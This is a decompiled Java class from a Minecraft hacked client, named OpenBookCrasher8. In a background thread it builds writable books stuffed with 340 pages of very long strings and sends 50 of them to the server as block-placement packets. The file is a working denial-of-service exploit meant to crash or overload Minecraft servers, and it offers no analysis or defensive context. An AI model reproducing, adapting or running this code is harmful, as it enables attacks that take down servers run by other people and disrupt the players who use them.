// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.obc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.util.math.BlockPos;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagCompound;
import java.util.Random;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class OpenBookCrasher8
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                for (Integer integer = 0; integer < 50; ++integer) {
                    final ItemStack book = new ItemStack(Items.WRITABLE_BOOK);
                    final String author = "HelloBro" + new Random().nextInt(50);
                    final String size = ".................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................................";
                    final NBTTagCompound tag = new NBTTagCompound();
                    final NBTTagList list = new NBTTagList();
                    for (Integer integer2 = 0; integer2 < 340; ++integer2) {
                        final String content = size;
                        final NBTTagString nbt_string = new NBTTagString(content);
                        list.appendTag(nbt_string);
                        final Integer integer3 = integer2;
                    }
                    tag.setString("author", author);
                    tag.setString("title", "");
                    tag.setTag("pages", list);
                    if (book.hasTagCompound()) {
                        final NBTTagCompound nbt_tag_pages = book.getTagCompound();
                        nbt_tag_pages.setTag("pages", list);
                    }
                    else {
                        book.setTagInfo("pages", list);
                    }
                    Minecraft.getMinecraft().getConnection().getNetworkManager().sendPacket(new CPacketPlayerBlockPlacement(new BlockPos(Minecraft.getMinecraft().player.posX, Minecraft.getMinecraft().player.posY - 2.0, Minecraft.getMinecraft().player.posZ), 1, book, 0.0f, 0.0f, 0.0f));
                    final Integer integer4 = integer;
                }
            }
        }.start();
    }
}
